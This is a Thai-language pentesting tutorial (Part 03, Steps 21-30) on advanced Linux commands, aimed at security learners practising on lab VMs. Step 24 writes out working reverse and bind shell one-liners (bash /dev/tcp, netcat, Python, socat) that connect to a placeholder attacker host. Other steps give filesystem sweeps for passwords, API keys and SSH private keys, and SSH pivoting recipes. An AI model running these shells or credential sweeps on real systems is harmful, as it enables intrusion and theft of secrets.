# Part 03: Linux Command Line ขั้นสูงสำหรับ Pentester (Steps 21-30)

## บทนำ

ทักษะ Linux Command Line ที่แข็งแกร่งคือพื้นฐานสำคัญของ Pentester ที่ดี ในบทนี้เราจะเรียนรู้คำสั่งขั้นสูงที่ใช้บ่อยในงาน Security ทั้งการค้นหาข้อมูล การจัดการ Network และการ Automate งาน

---

## Step 21: Advanced File Operations

### find ขั้นสูง

```bash
# ==========================================
# find - ค้นหาไฟล์แบบขั้นสูง
# ==========================================

# ค้นหาและดำเนินการ (-exec)
find /etc -name "*.conf" -exec cat {} \;
find /var/log -name "*.log" -exec grep -l "error" {} \;
find . -name "*.py" -exec grep -l "password" {} \;

# ค้นหาตาม size
find / -size +10M 2>/dev/null              # ไฟล์ใหญ่กว่า 10MB
find / -size -1k 2>/dev/null               # ไฟล์เล็กกว่า 1KB
find / -size +100M -size -1G 2>/dev/null   # ระหว่าง 100MB-1GB

# ค้นหาตาม time
find / -mtime -1 2>/dev/null               # แก้ไขใน 24 ชั่วโมง
find / -mtime +30 2>/dev/null              # ไม่ได้แก้มากกว่า 30 วัน
find / -atime -7 2>/dev/null               # เข้าถึงใน 7 วัน
find / -newer /etc/passwd 2>/dev/null      # ใหม่กว่า /etc/passwd
find / -mmin -60 2>/dev/null               # แก้ไขใน 60 นาที

# ค้นหาตาม permission (สำคัญสำหรับ Privilege Escalation)
find / -perm -4000 -type f 2>/dev/null     # SUID files
find / -perm -2000 -type f 2>/dev/null     # SGID files
find / -perm -0002 -type f 2>/dev/null     # World-writable files
find / -perm -0002 -type d 2>/dev/null     # World-writable directories
find / -perm /0002 -user root 2>/dev/null  # Root-owned writable

# ค้นหาไฟล์ที่เขียนได้ (Privilege Escalation)
find /etc -writable -type f 2>/dev/null
find / -writable -path '/proc' -prune -o -writable -type d 2>/dev/null

# ค้นหา capabilities
find / -exec getcap {} \; 2>/dev/null | grep -v "^$"

# รวม conditions
find /home -user www-data -type f -name "*.php" 2>/dev/null
find / \( -name "*.conf" -o -name "*.config" \) 2>/dev/null
find / ! -user root -perm -4000 2>/dev/null  # SUID ไม่ใช่ root

# ค้นหา credentials ในไฟล์
find / -name "*.php" -exec grep -l "password\|passwd\|secret" {} \; 2>/dev/null
find / -name "wp-config.php" 2>/dev/null
find / -name ".env" 2>/dev/null
find / -name "config.php" 2>/dev/null
find / -name "database.yml" 2>/dev/null
find / -name "settings.py" 2>/dev/null

# ค้นหา SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
find / -name "known_hosts" 2>/dev/null
```

### xargs ขั้นสูง

```bash
# ==========================================
# xargs - ส่ง input เป็น arguments
# ==========================================

# พื้นฐาน
echo "file1 file2 file3" | xargs touch
cat urls.txt | xargs curl -O

# -n ส่ง N arguments ต่อครั้ง
cat files.txt | xargs -n 1 file
cat ips.txt | xargs -n 1 ping -c 1

# -P ทำงาน parallel
cat urls.txt | xargs -P 10 -I{} curl -s {} > /dev/null
cat ips.txt | xargs -P 20 -I{} nmap -sn {}

# -I กำหนดตำแหน่ง argument
cat targets.txt | xargs -I{} nmap -sV -p 80,443 {}
cat files.txt | xargs -I{} mv {} {}.bak

# ใช้กับ find
find . -name "*.log" | xargs grep "error"
find . -name "*.py" | xargs wc -l
find / -name "*.conf" 2>/dev/null | xargs -I{} grep -l "password" {}

# ตรวจสอบ SUID แบบ parallel
find / -perm -4000 -type f 2>/dev/null | xargs -P 5 -I{} ls -la {}

# Null separator สำหรับไฟล์ที่มีช่องว่าง
find . -name "*.txt" -print0 | xargs -0 cat
```

---

## Step 22: Archive & Compression

```bash
# ==========================================
# tar - Tape Archive
# ==========================================

# สร้าง archive
tar -cvf archive.tar files/           # Create + Verbose + File
tar -czvf archive.tar.gz files/       # + Gzip
tar -cjvf archive.tar.bz2 files/      # + Bzip2
tar -cJvf archive.tar.xz files/       # + xz (เล็กที่สุด)

# แตกไฟล์
tar -xvf archive.tar                  # Extract + Verbose
tar -xzvf archive.tar.gz              # + Gzip
tar -xjvf archive.tar.bz2             # + Bzip2
tar -xJvf archive.tar.xz              # + xz
tar -xvf archive.tar -C /target/dir/  # แตกไปยัง directory อื่น

# ดูเนื้อหาโดยไม่แตก
tar -tvf archive.tar
tar -tzvf archive.tar.gz

# แตกเฉพาะไฟล์ที่ต้องการ
tar -xvf archive.tar file1 file2
tar -xvf archive.tar --wildcards "*.conf"

# เพิ่มไฟล์เข้า archive
tar -rvf archive.tar newfile.txt

# ==========================================
# gzip / bzip2 / xz
# ==========================================

# gzip
gzip file.txt                         # บีบอัด (ลบไฟล์เดิม)
gzip -k file.txt                      # เก็บไฟล์เดิมไว้
gzip -9 file.txt                      # บีบสูงสุด
gzip -d file.txt.gz                   # คลายการบีบ
gunzip file.txt.gz                    # เหมือน gzip -d
zcat file.txt.gz                      # อ่านโดยไม่แตก

# bzip2 (บีบได้ดีกว่า gzip)
bzip2 file.txt
bzip2 -k file.txt
bzcat file.txt.bz2

# xz (บีบได้ดีที่สุด แต่ช้า)
xz file.txt
xz -k file.txt
xz -9 file.txt
xzcat file.txt.xz

# ==========================================
# zip
# ==========================================

# สร้าง zip
zip archive.zip file1 file2
zip -r archive.zip directory/
zip -e archive.zip file.txt            # เข้ารหัส
zip -j archive.zip path/to/files       # ไม่เก็บ path

# แตก zip
unzip archive.zip
unzip archive.zip -d /target/dir/
unzip -l archive.zip                   # ดูเนื้อหา
unzip -o archive.zip                   # overwrite

# ==========================================
# 7zip
# ==========================================
sudo apt install p7zip-full

# สร้าง
7z a archive.7z files/
7z a -p"password" archive.7z files/   # ใส่ password

# แตก
7z x archive.7z
7z x archive.7z -o/target/dir/
7z l archive.7z                        # ดูเนื้อหา

# ==========================================
# ดู magic bytes / identify compressed files
# ==========================================
file archive.tar.gz
file unknownfile
binwalk file.bin                       # สำหรับ embedded files
```

---

## Step 23: Text Manipulation Advanced

### awk ขั้นสูง

```bash
# ==========================================
# awk - Powerful Text Processing
# ==========================================

# โครงสร้าง awk
# awk 'BEGIN{...} pattern{action} END{...}' file

# Variables พื้นฐาน:
# $0 = ทั้งบรรทัด
# $1, $2... = fields
# NR = record number (บรรทัดปัจจุบัน)
# NF = number of fields
# FS = field separator (default: whitespace)
# OFS = output field separator
# RS = record separator

# ตัวอย่าง
awk '{print NR": "$0}' file.txt           # เพิ่มเลขบรรทัด
awk '{print NF}' file.txt                  # แสดงจำนวน fields
awk 'NF > 0' file.txt                      # ลบบรรทัดว่าง
awk 'length($0) > 80' file.txt             # บรรทัดยาวกว่า 80

# Conditions
awk '$3 > 1000' /etc/passwd                # UID > 1000
awk -F: '$3 == 0' /etc/passwd              # UID = 0 (root)
awk -F: '$7 != "/bin/false"' /etc/passwd   # shell ไม่ใช่ false
awk -F: 'NR>1 && $3 >= 1000' /etc/passwd  # users จริง

# Calculations
awk '{sum += $1} END {print "Total:", sum}' numbers.txt
awk '{sum += $5} END {print "Avg:", sum/NR}' file.txt
awk 'NR==1{max=$1} $1>max{max=$1} END{print max}' numbers.txt

# Multiple actions
awk -F: '{print $1"\t"$3"\t"$6}' /etc/passwd

# Built-in functions
awk '{print toupper($0)}' file.txt        # uppercase
awk '{print tolower($0)}' file.txt        # lowercase
awk '{print length($0)}' file.txt         # ความยาว
awk '{gsub(/old/, "new"); print}' file.txt # replace ทั้งหมด

# ตัวอย่างสำหรับ Security:
# ดูเฉพาะ users ที่ login ได้
awk -F: '$7 !~ /false|nologin/' /etc/passwd

# ดู open ports จาก nmap output
nmap -sV target | awk '/open/{print $1, $3}'

# Parse log files
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -20

# ==========================================
# sed ขั้นสูง
# ==========================================

# Multiple substitutions
sed 's/foo/bar/g; s/baz/qux/g' file.txt

# Delete lines
sed '/^#/d' file.txt                      # ลบ comments
sed '/^$/d' file.txt                      # ลบบรรทัดว่าง
sed '1,5d' file.txt                       # ลบบรรทัด 1-5
sed '/pattern/,/end_pattern/d' file.txt   # ลบ range

# Insert/Append
sed '5i\New line before line 5' file.txt  # แทรกก่อน
sed '5a\New line after line 5' file.txt   # แทรกหลัง
sed '/pattern/i\New line' file.txt        # แทรกก่อน pattern

# Print specific lines
sed -n '10,20p' file.txt                  # แสดงบรรทัด 10-20
sed -n '/start/,/end/p' file.txt          # แสดง range

# Multiple -e
sed -e 's/foo/bar/g' -e 's/baz/qux/g' file.txt

# Address ranges
sed '1,/end/s/foo/bar/g' file.txt         # เฉพาะก่อน /end/
sed '/start/,/end/s/foo/bar/g' file.txt   # เฉพาะใน range

# ==========================================
# tr - Translate Characters
# ==========================================
tr 'a-z' 'A-Z' < file.txt                # lowercase to uppercase
tr 'A-Z' 'a-z' < file.txt                # uppercase to lowercase
tr -d ' ' < file.txt                      # ลบช่องว่าง
tr -d '\n' < file.txt                     # ลบ newlines
tr -s ' ' < file.txt                      # บีบช่องว่างต่อเนื่อง
tr ':' '\n' < /etc/passwd                 # แทน : ด้วย newline

# Caesar cipher (ROT13)
echo "Hello World" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# ==========================================
# tee - ส่ง output ไปหลายที่
# ==========================================
command | tee output.txt | another_command
nmap -sV target | tee scan.txt | grep "open"
command | tee -a log.txt    # append แทนที่จะ overwrite
```

---

## Step 24: Network Commands Advanced

### Netcat (nc) - Swiss Army Knife

```bash
# ==========================================
# netcat / ncat - Network Tool
# ==========================================

# ติดตั้ง
sudo apt install netcat-traditional   # nc
sudo apt install ncat                  # ncat (Nmap version)

# ==========================================
# การใช้งานพื้นฐาน
# ==========================================

# Banner Grabbing
nc -v 192.168.1.1 22        # SSH banner
nc -v 192.168.1.1 80        # HTTP banner
nc -v 192.168.1.1 21        # FTP banner
nc -v 192.168.1.1 25        # SMTP banner

# Port Scanning (ช้า แต่ simple)
nc -zvw3 192.168.1.1 1-1000    # scan port 1-1000
nc -zvw3 192.168.1.1 80 443 22 # scan specific ports

# HTTP Request
echo -e "GET / HTTP/1.0\r\n\r\n" | nc 192.168.1.1 80

# ==========================================
# File Transfer
# ==========================================

# Receiver (รอรับ)
nc -lvp 4444 > received_file.txt

# Sender (ส่ง)
nc 192.168.1.1 4444 < file_to_send.txt

# ส่งโฟลเดอร์
nc -lvp 4444 | tar xzv    # Receiver
tar czv files/ | nc 192.168.1.1 4444  # Sender

# ==========================================
# Reverse Shell
# ==========================================

# Listener (Attacker)
nc -lvp 4444

# Reverse Shell (Victim) - หลายรูปแบบ
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
nc attacker_ip 4444 -e /bin/bash
nc -c bash attacker_ip 4444
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("attacker_ip",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'

# ==========================================
# Bind Shell
# ==========================================

# Victim (รอ connection)
nc -lvp 4444 -e /bin/bash

# Attacker (เชื่อมต่อ)
nc victim_ip 4444

# ==========================================
# Chat / Communication
# ==========================================

# Terminal 1 (Server)
nc -lvp 4444

# Terminal 2 (Client)
nc server_ip 4444

# ==========================================
# HTTP Server ง่ายๆ
# ==========================================
while true; do
    nc -lvp 80 <<< "HTTP/1.0 200 OK\nContent-Type: text/html\n\n<h1>Hello</h1>"
done
```

### Socat - Advanced Network Tool

```bash
# ==========================================
# socat - Socket Cat (ทรงพลังกว่า nc)
# ==========================================
sudo apt install socat

# Port Forwarding
socat TCP-LISTEN:8080,fork TCP:server:80

# Relay
socat TCP-LISTEN:2222,fork TCP:192.168.1.1:22

# Encrypted Reverse Shell (SSL)
# Attacker:
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0 -
# Victim:
socat OPENSSL:attacker:443,verify=0 EXEC:/bin/bash

# Upgrade Shell (PTY)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker_ip:4444

# Listener สำหรับ reverse shell
socat -d -d TCP-LISTEN:4444 STDOUT
```

### curl และ wget ขั้นสูง

```bash
# ==========================================
# curl - Transfer Data
# ==========================================

# HTTP Methods
curl http://target.com
curl -X GET http://target.com/api/users
curl -X POST http://target.com/login -d "user=admin&pass=admin"
curl -X PUT http://target.com/api/users/1 -d '{"name":"new"}'
curl -X DELETE http://target.com/api/users/1

# Headers
curl -H "Content-Type: application/json" http://target.com
curl -H "Authorization: Bearer TOKEN" http://target.com/api
curl -H "X-Forwarded-For: 127.0.0.1" http://target.com

# Authentication
curl -u admin:password http://target.com
curl --digest -u admin:password http://target.com

# Cookies
curl -c cookies.txt http://target.com/login     # บันทึก cookies
curl -b cookies.txt http://target.com/profile   # ใช้ cookies
curl -b "session=abc123" http://target.com

# SSL/TLS
curl -k https://target.com              # ข้ามการตรวจสอบ cert
curl --cacert ca.pem https://target.com
curl -E client.pem https://target.com  # Client certificate

# Redirect
curl -L http://target.com              # ตาม redirect
curl -L --max-redirs 10 http://target.com

# Output
curl -o output.html http://target.com
curl -O http://target.com/file.zip     # บันทึกชื่อเดิม
curl -s http://target.com              # ไม่แสดง progress

# Proxy
curl -x http://proxy:8080 http://target.com
curl --socks5 127.0.0.1:1080 http://target.com

# Verbose (debug)
curl -v http://target.com
curl -I http://target.com              # Headers only

# ตัวอย่าง API Testing
curl -s -X POST \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"password"}' \
     http://target.com/api/auth | python3 -m json.tool

# ==========================================
# wget - Download Files
# ==========================================

# ดาวน์โหลดไฟล์
wget http://target.com/file.zip
wget -O custom_name.zip http://target.com/file.zip

# Mirror เว็บไซต์
wget --mirror --convert-links --page-requisites http://target.com

# Recursive download
wget -r -l 3 http://target.com/     # depth 3
wget -r -A "*.pdf" http://target.com  # เฉพาะ PDF

# Resume download
wget -c http://target.com/largefile.zip

# Username/Password
wget --http-user=admin --http-password=pass http://target.com

# Quiet mode
wget -q http://target.com/file.zip

# ดาวน์โหลดจากรายการ
wget -i urls.txt
```

---

## Step 25: File System & Disk Management

```bash
# ==========================================
# Disk Space
# ==========================================

# df - disk free space
df -h                              # human readable
df -h /home                        # เฉพาะ /home
df -h --total                      # รวมทุก filesystem
df -T                              # แสดง filesystem type
df -i                              # inodes

# du - disk usage
du -h file.txt                     # ขนาดไฟล์
du -sh directory/                  # ขนาดโฟลเดอร์
du -sh *                           # ทุกอย่างในโฟลเดอร์ปัจจุบัน
du -sh /* 2>/dev/null              # ทุก root directory
du -sh ~/*                         # home ทุกโฟลเดอร์

# หาไฟล์ใหญ่
du -ah / 2>/dev/null | sort -rh | head -20

# ==========================================
# Mount & Unmount
# ==========================================

# ดู mounted filesystems
mount
lsblk                              # block devices
lsblk -f                           # พร้อม filesystem info
fdisk -l 2>/dev/null               # partition table

# mount
sudo mount /dev/sdb1 /mnt/usb
sudo mount -t ntfs-3g /dev/sdb1 /mnt/windows
sudo mount -o loop disk.img /mnt/iso
sudo mount -o remount,rw /

# umount
sudo umount /mnt/usb
sudo umount -f /mnt/usb            # force
sudo umount -l /mnt/usb            # lazy

# ==========================================
# สำคัญ! ค้นหา sensitive info ใน filesystem
# ==========================================

# ค้นหา passwords ในไฟล์ config
grep -r "password\|passwd\|pwd" /etc/ 2>/dev/null
grep -r "DB_PASS\|DB_USER" / 2>/dev/null
grep -r "secret_key\|api_key" / 2>/dev/null

# ดู /proc สำหรับ process info
cat /proc/version                  # kernel version
cat /proc/cpuinfo                  # CPU info
cat /proc/meminfo                  # memory info
cat /proc/net/tcp                  # TCP connections (hex)
ls /proc/ | grep "^[0-9]"         # running processes

# ดูสิ่งที่ mount อยู่
cat /proc/mounts
cat /proc/partitions
cat /etc/fstab                     # ค้นหา credentials ใน fstab
```

---

## Step 26: System Information สำหรับ Privilege Escalation

```bash
# ==========================================
# System Info (Critical for Priv Esc)
# ==========================================

# OS Information
uname -a                           # ข้อมูล kernel ทั้งหมด
uname -r                           # kernel version
cat /etc/os-release                # OS details
cat /etc/issue                     # Banner
cat /proc/version                  # kernel + compiler
lsb_release -a                     # LSB info

# Hardware
lshw -short                        # hardware list
lscpu                              # CPU
lspci                              # PCI devices
lsusb                              # USB devices
dmidecode                          # BIOS/hardware info

# Memory
free -h                            # memory usage
cat /proc/meminfo                  # detailed memory
vmstat                             # virtual memory stats

# ==========================================
# Process & Service Enumeration
# ==========================================

# ดู processes ทั้งหมด
ps aux
ps aux --forest
ps -ef

# ดู processes ที่รันด้วย root
ps aux | awk '$1 == "root" {print}'

# ดู scheduled jobs
crontab -l                         # cron ของ user ปัจจุบัน
sudo crontab -l                    # cron ของ root
cat /etc/crontab                   # system crontab
ls -la /etc/cron.*                 # cron directories
cat /etc/cron.d/*                  # cron.d files

# ดู SUID / SGID (Privilege Escalation)
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# ดู capabilities (Privilege Escalation)
getcap -r / 2>/dev/null

# ดู sudo permissions
sudo -l

# ดู network info
ip a
ip route
netstat -tulanp 2>/dev/null || ss -tulanp
arp -a

# ดู installed software
dpkg -l
rpm -qa
pip3 list
gem list

# ดู environment variables
env
printenv
cat ~/.bashrc
cat ~/.bash_history
cat ~/.zsh_history

# ดูไฟล์ที่เปิดอยู่
lsof -i                            # network connections
lsof -u username                   # ของ user
lsof -p PID                        # ของ process
```

---

## Step 27: Scheduling Tasks

### cron

```bash
# ==========================================
# cron - Schedule Tasks
# ==========================================

# แก้ไข crontab
crontab -e
sudo crontab -e                    # root crontab

# รูปแบบ crontab:
# * * * * * command
# │ │ │ │ │
# │ │ │ │ └── Day of Week (0-7, 0 and 7 = Sunday)
# │ │ │ └──── Month (1-12)
# │ │ └────── Day of Month (1-31)
# │ └──────── Hour (0-23)
# └────────── Minute (0-59)

# ตัวอย่าง
# ทุกนาที
* * * * * /path/to/script.sh

# ทุกชั่วโมง
0 * * * * /path/to/script.sh

# ทุกวันตี 2
0 2 * * * /path/to/script.sh

# ทุกวันจันทร์เวลา 9 โมงเช้า
0 9 * * 1 /path/to/script.sh

# ทุก 15 นาที
*/15 * * * * /path/to/script.sh

# วันที่ 1 ทุกเดือน
0 0 1 * * /path/to/backup.sh

# ดู cron log
grep CRON /var/log/syslog
tail -f /var/log/cron.log

# Cron สำหรับ Security (เช่น auto-update, auto-scan)
# Run nmap scan daily
0 2 * * * /root/scripts/daily_scan.sh >> /root/logs/scan.log 2>&1

# Check for changes in /etc
*/5 * * * * md5sum /etc/passwd /etc/shadow > /tmp/md5check.txt
```

---

## Step 28: SSH ขั้นสูง

### SSH Key Management

```bash
# ==========================================
# SSH Keys
# ==========================================

# สร้าง SSH key pair
ssh-keygen -t rsa -b 4096 -C "your@email.com"
ssh-keygen -t ed25519 -C "your@email.com"    # ปลอดภัยกว่า rsa
ssh-keygen -t ecdsa -b 521 -C "comment"

# ดู key fingerprint
ssh-keygen -l -f ~/.ssh/id_rsa.pub
ssh-keygen -l -E md5 -f ~/.ssh/id_rsa.pub   # MD5 format

# ส่ง public key ไปยัง server
ssh-copy-id user@server
ssh-copy-id -i ~/.ssh/id_rsa.pub user@server

# ทำด้วยตัวเอง
cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys  # บน server

# ==========================================
# SSH Config (~/.ssh/config)
# ==========================================
cat > ~/.ssh/config << 'EOF'
# Default settings
Host *
    AddressFamily inet
    ServerAliveInterval 60
    ServerAliveCountMax 3
    StrictHostKeyChecking accept-new
    
# Specific host
Host myserver
    HostName 192.168.1.100
    User admin
    Port 2222
    IdentityFile ~/.ssh/myserver_key
    
# Jump Host
Host internal
    HostName 10.0.0.50
    User admin
    ProxyJump myserver
    
# SOCKS Proxy
Host proxy
    HostName vpn.example.com
    User admin
    DynamicForward 1080
EOF

chmod 600 ~/.ssh/config

# ใช้งาน
ssh myserver                    # เชื่อมต่อด้วย alias
ssh internal                    # ผ่าน jump host
```

### SSH Port Forwarding (Tunneling)

```bash
# ==========================================
# SSH Port Forwarding
# ==========================================

# Local Port Forwarding (-L)
# เข้าถึง remote service ผ่าน local port
# ssh -L [local_addr:]local_port:remote_host:remote_port user@ssh_server

# ตัวอย่าง: เข้า MySQL บน remote ผ่าน local port 3307
ssh -L 3307:localhost:3306 user@server
mysql -h 127.0.0.1 -P 3307 -u root -p

# เข้า Web App บน internal network
ssh -L 8080:10.0.0.50:80 user@jumphost
# แล้วเปิด browser ไป http://localhost:8080

# Remote Port Forwarding (-R)
# ให้ remote server เข้าถึง service บน local
# ssh -R [remote_addr:]remote_port:local_host:local_port user@ssh_server

# ตัวอย่าง: ทำ Reverse SSH Tunnel
ssh -R 4444:localhost:22 user@public_server
# ตอนนี้ public_server สามารถ ssh ผ่าน port 4444 มาถึงเรา

# Dynamic Port Forwarding (-D) - SOCKS Proxy
ssh -D 1080 user@server
# Configure browser to use SOCKS5 proxy at 127.0.0.1:1080

# ใช้ proxychains กับ SOCKS proxy
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT 10.0.0.0/24

# Keep tunnel alive
ssh -fNL 8080:localhost:80 user@server  # -f background, -N no command

# ==========================================
# SSH Pivoting (สำคัญมากสำหรับ Red Team)
# ==========================================

# Scenario: Attacker -> Server1 -> Server2 (internal)
# เข้าถึง Server2 (10.0.0.50) ผ่าน Server1 (public IP)

# วิธีที่ 1: ProxyJump
ssh -J user@server1 user@10.0.0.50

# วิธีที่ 2: ProxyCommand
ssh -o ProxyCommand="ssh user@server1 -W %h:%p" user@10.0.0.50

# วิธีที่ 3: Port Forward
ssh -L 2222:10.0.0.50:22 user@server1
ssh -p 2222 user@localhost    # เข้า server2

# วิธีที่ 4: SOCKS5 ผ่าน Server1
ssh -D 1080 user@server1
proxychains ssh user@10.0.0.50
```

---

## Step 29: tmux สำหรับ Long Sessions

```bash
# ==========================================
# tmux - Terminal Multiplexer
# ==========================================
sudo apt install tmux

# ==========================================
# Session Management
# ==========================================
tmux                              # เปิด tmux ใหม่
tmux new -s mysession             # สร้าง named session
tmux ls                           # ดูรายการ sessions
tmux attach -t mysession          # กลับเข้า session
tmux attach -t 0                  # กลับเข้า session 0
tmux kill-session -t mysession    # ลบ session

# ==========================================
# Shortcuts (Prefix = Ctrl+B โดย default)
# ==========================================

# Sessions
Ctrl+B d         = Detach (ออกโดยไม่ปิด)
Ctrl+B $         = เปลี่ยนชื่อ session
Ctrl+B (         = session ก่อนหน้า
Ctrl+B )         = session ถัดไป

# Windows (Tabs)
Ctrl+B c         = สร้าง window ใหม่
Ctrl+B w         = รายการ windows
Ctrl+B 0-9       = เปลี่ยนไป window ตามเลข
Ctrl+B n         = window ถัดไป
Ctrl+B p         = window ก่อนหน้า
Ctrl+B ,         = เปลี่ยนชื่อ window
Ctrl+B &         = ปิด window

# Panes (Split Screen)
Ctrl+B %         = แบ่งแนวตั้ง
Ctrl+B "         = แบ่งแนวนอน
Ctrl+B →←↑↓     = เปลี่ยน pane
Ctrl+B z         = zoom pane (fullscreen toggle)
Ctrl+B x         = ปิด pane
Ctrl+B { }       = สลับตำแหน่ง pane

# Copy Mode
Ctrl+B [         = เข้า copy mode
Space            = เริ่ม select
Enter            = copy
Ctrl+B ]         = paste

# ==========================================
# ตั้งค่า ~/.tmux.conf
# ==========================================
cat > ~/.tmux.conf << 'EOF'
# เปลี่ยน prefix เป็น Ctrl+A (เหมือน screen)
# set -g prefix C-a
# unbind C-b

# Mouse support
set -g mouse on

# Start windows numbering at 1
set -g base-index 1
setw -g pane-base-index 1

# Status bar
set -g status-bg black
set -g status-fg white
set -g status-left '[#S] '
set -g status-right '%H:%M %d-%b-%y'

# Split panes
bind | split-window -h
bind - split-window -v

# Reload config
bind r source-file ~/.tmux.conf \; display "Reloaded!"

# Increase scrollback buffer
set -g history-limit 10000
EOF

# ==========================================
# tmux สำหรับ Pentesting
# ==========================================

# Script เปิด tmux session พร้อมหน้าต่างต่างๆ
#!/bin/bash
TARGET=$1
SESSION="pentest_$TARGET"

tmux new-session -d -s $SESSION -n "Main"
tmux new-window -t $SESSION -n "Recon"
tmux new-window -t $SESSION -n "Exploit"
tmux new-window -t $SESSION -n "PostEx"
tmux new-window -t $SESSION -n "Notes"

tmux send-keys -t $SESSION:Recon "nmap -sV $TARGET" Enter
tmux select-window -t $SESSION:Main
tmux attach-session -t $SESSION
```

---

## Step 30: grep/regex ขั้นสูง

### Regular Expressions

```bash
# ==========================================
# Regex Basics
# ==========================================
# .     = ตัวอักษรใดก็ได้ 1 ตัว
# *     = ตัวก่อนหน้า 0 ครั้งขึ้นไป
# +     = ตัวก่อนหน้า 1 ครั้งขึ้นไป
# ?     = ตัวก่อนหน้า 0 หรือ 1 ครั้ง
# {n}   = ตัวก่อนหน้า n ครั้ง
# {n,m} = ตัวก่อนหน้า n-m ครั้ง
# ^     = ต้นบรรทัด
# $     = ปลายบรรทัด
# [abc] = a, b หรือ c
# [^abc]= ไม่ใช่ a, b หรือ c
# \d    = digit [0-9]
# \w    = word char [a-zA-Z0-9_]
# \s    = whitespace
# \b    = word boundary

# ==========================================
# grep ขั้นสูง
# ==========================================

# Basic patterns
grep "^error" file.txt            # บรรทัดเริ่มด้วย error
grep "\.php$" file.txt            # บรรทัดลงท้ายด้วย .php
grep "[0-9]\{3\}" file.txt        # มีตัวเลข 3 ตัวติดกัน

# Extended regex (-E หรือ egrep)
grep -E "error|warning|critical" log.txt
grep -E "^(root|admin|user)" /etc/passwd
grep -E "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" file.txt  # IP

# Perl regex (-P)
grep -P "(?<=password=)\w+" file.txt   # lookbehind
grep -P "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b" file.txt  # email

# ==========================================
# Security-Specific Patterns
# ==========================================

# หา IP addresses
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" log.txt

# หา email addresses
grep -oE "[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}" file.txt

# หา URLs
grep -oE "https?://[^ ]+" file.txt

# หา passwords ในไฟล์
grep -rn "password\s*=\s*['\"][^'\"]*['\"]" .
grep -rn "passwd\s*=\s*" /etc/ 2>/dev/null

# หา API keys / tokens
grep -rn "api[_-]?key\s*=\s*['\"][^'\"]*['\"]" . 2>/dev/null
grep -rn "token\s*=\s*['\"][^'\"]*['\"]" . 2>/dev/null

# หา private keys
grep -rn "BEGIN.*PRIVATE KEY" / 2>/dev/null

# หา SQL connection strings
grep -rn "mysql://\|postgresql://\|mongodb://" . 2>/dev/null

# หา hardcoded IPs
grep -rn "\b192\.168\.\|10\.\|172\.[0-9]*\." . 2>/dev/null

# วิเคราะห์ access log
grep " 200 " /var/log/apache2/access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head 20
grep " 404 " /var/log/apache2/access.log | awk '{print $7}' | sort | uniq -c | sort -rn | head 20
grep " 500 " /var/log/apache2/access.log | tail -20

# หา failed login attempts
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn

# ==========================================
# ripgrep (rg) - เร็วกว่า grep มาก
# ==========================================
sudo apt install ripgrep

# เร็วกว่า grep มาก
rg "password" .
rg -r "old" -r "new" file.txt     # ดู matches
rg --type py "import" .           # เฉพาะ Python files
rg -i "error" --glob "*.log" .    # case insensitive

# ==========================================
# Script: Find Sensitive Data
# ==========================================
#!/bin/bash
# sensitive_finder.sh

TARGET_DIR="${1:-.}"
echo "Searching for sensitive data in: $TARGET_DIR"

echo "=== Passwords ==="
grep -rn --include="*.{php,py,rb,conf,cfg,ini,env,yaml,yml,json}" \
    -E "password\s*[=:]\s*.+" "$TARGET_DIR" 2>/dev/null

echo "=== API Keys ==="
grep -rn --include="*.{php,py,rb,conf,cfg,ini,env,yaml,yml,json}" \
    -E "api[_-]?key\s*[=:]\s*.+" "$TARGET_DIR" 2>/dev/null

echo "=== Database Credentials ==="
grep -rn \
    -E "(mysql|postgres|mongodb)://[^@]+@" "$TARGET_DIR" 2>/dev/null

echo "=== Private Keys ==="
find "$TARGET_DIR" -name "*.pem" -o -name "*.key" -o -name "id_rsa" 2>/dev/null
```

---

## สรุป Part 03

ในบทนี้คุณได้เรียนรู้:

✅ **Step 21**: Advanced File Operations (find, xargs ขั้นสูง)  
✅ **Step 22**: Archive & Compression Tools  
✅ **Step 23**: Text Manipulation Advanced (awk, sed ขั้นสูง)  
✅ **Step 24**: Network Commands (netcat, socat, curl, wget)  
✅ **Step 25**: File System & Disk Management  
✅ **Step 26**: System Information สำหรับ Privilege Escalation  
✅ **Step 27**: Scheduling Tasks (cron)  
✅ **Step 28**: SSH ขั้นสูง (Tunneling, Port Forwarding)  
✅ **Step 29**: tmux สำหรับ Long Sessions  
✅ **Step 30**: grep/regex ขั้นสูงสำหรับ Security  

## แบบฝึกหัด

1. ค้นหาไฟล์ SUID ทั้งหมดในระบบและบันทึกผล
2. ใช้ find หาไฟล์ที่มีคำว่า "password" ใน /etc/
3. สร้าง tmux session สำหรับ pentest พร้อม 5 windows
4. ตั้งค่า SSH key-based auth กับ Metasploitable VM
5. สร้าง SSH tunnel จาก local port ไปยัง service บน VM

## ถัดไป: Part 04 - Networking Fundamentals

---

*Part 03 | Steps 21-30 | ระดับ: พื้นฐาน-กลาง*